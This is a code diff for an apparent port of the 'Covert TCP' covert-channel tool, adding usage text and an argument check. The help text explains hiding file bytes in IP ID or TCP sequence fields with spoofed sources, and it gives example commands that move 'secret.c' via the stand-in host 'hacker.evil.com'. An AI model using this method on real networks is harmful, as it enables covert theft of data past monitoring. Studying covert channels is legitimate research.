@@ -4,7 +4,7 @@
 #include <dnet.h>
 
 #include "utils/argparser.h"
-#include "EndpointFactory.h"
+#include "endpoints/EndpointFactory.h"
 
 using namespace std;
 
@@ -27,6 +27,39 @@ unsigned int host_convert(const char *hostname)
     return i.s_addr;
 } /* end resolver */
 
+/* Tell them how to use this */
+void usage(char *progname)
+{
+    printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file filename -source_port port -dest_port port -server [encode type]\n\n", progname);
+    printf("-dest dest_ip      - Host to send data to.\n");
+    printf("-source source_ip  - Host where you want the data to originate from.\n");
+    printf("                     In SERVER mode this is the host data will\n");
+    printf("                     be coming FROM.\n");
+    printf("-source_port port  - IP source port you want data to appear from. \n");
+    printf("                     (randomly set by default)\n");
+    printf("-dest_port port    - IP source port you want data to go to. In\n");
+    printf("                     SERVER mode this is the port data will be coming\n");
+    printf("                     inbound on. Port 80 by default.\n");
+    printf("-file filename     - Name of the file to encode and transfer.\n");
+    printf("-server            - Passive mode to allow receiving of data.\n");
+    printf("[Encode Type] - Optional encoding type\n");
+    printf("-ipid - Encode data a byte at a time in the IP packet ID. [DEFAULT]\n");
+    printf("-seq  - Encode data a byte at a time in the packet sequence number.\n");
+    printf("-ack  - DECODE data a byte at a time from the ACK field.\n");
+    printf("        This ONLY works from server mode and is made to decode\n");
+    printf("        covert channel packets that have been bounced off a remote\n");
+    printf("        server using -seq. See documentation for details\n");
+    printf("\nPress ENTER for examples.");
+    getchar();
+    printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com -source_port 1234 -dest_port 80 -file secret.c\n\n");
+    printf("Above sends the file secret.c to the host hacker.evil.com a byte \n");
+    printf("at a time using the default IP packet ID encoding.\n");
+    printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com -dest_port 80 -server -file secret.c\n\n");
+    printf("Above listens passively for packets from  hacker.evil.com\n");
+    printf("destined for port 80. It takes the data and saves the file locally\n");
+    printf("as secret.c\n\n");
+    exit(0);
+} /* end usage() */
 
 
 int main(int argc, char * argv[]){
@@ -37,6 +70,13 @@ int main(int argc, char * argv[]){
     if(geteuid() !=0){
         cout << "You Need To Be Root To Run This. Aborting" << endl;
         return 1;
+    }
+
+    /* Tell them how to use this thing */
+    if((argc < 6) || (argc > 13))
+    {
+        usage(argv[0]);
+        exit(0);
     }
 
     ArgParcer arguments;
